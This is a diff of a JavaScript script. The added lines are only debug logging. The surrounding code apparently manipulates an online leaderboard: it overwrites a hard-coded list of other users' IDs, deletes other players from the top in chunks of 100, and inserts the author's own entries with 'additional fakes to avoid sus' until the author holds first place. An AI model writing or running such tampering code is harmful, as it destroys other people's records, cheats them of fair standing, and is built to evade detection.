@@ -30,6 +30,7 @@
                 }
 
                 // 1. Remove only the annoying ones
+                console.debug("Removing annoying...");
                 [20771, 20853, 20962, 20963, 21087, 21234, 21250, 21317, 21477].forEach(u => {
                     if (g_stop_all === false) {
                         console.debug("Overwriting " + u);
@@ -49,6 +50,7 @@
                 //    Make sure to remove in chunks in order to avoid too much traffic.
                 //  2.a. Get latest userID using create_user
                 //  2.b. Remove x players from the latest using reset_users_range
+                console.debug("Creating users...");
                 create_user_impl('Gilad Efrati', '1234567890');
                 await new Promise(r => setTimeout(r, 5000));    // Wait for response...
                 if (new_user == 0) {
@@ -59,6 +61,7 @@
                 let latest_user = new_user;
                 console.debug("[*] New user: " + latest_user);
 
+                console.debug("Removing users from top...");
                 for (let count = 0; count < 5; count++) {
                     if (g_stop_all === false) {
                         console.debug("[*] Remove 100's chunk: " + count);
@@ -72,6 +75,7 @@
                 }
 
                 // 2. Set my own values, with additional fakes to avoid sus
+                console.debug("Updating my own users...");
                 if (g_stop_all === false && first_place_is_me === false) {
                     await update_my_users_impl();
                     if (first_place_is_me) {
@@ -80,6 +84,7 @@
                 }
 
                 // Sleep for 1 minutes.
+                console.debug("Going to sleep...");
                 await new Promise(r => setTimeout(r, sleep_time));
             }
         }
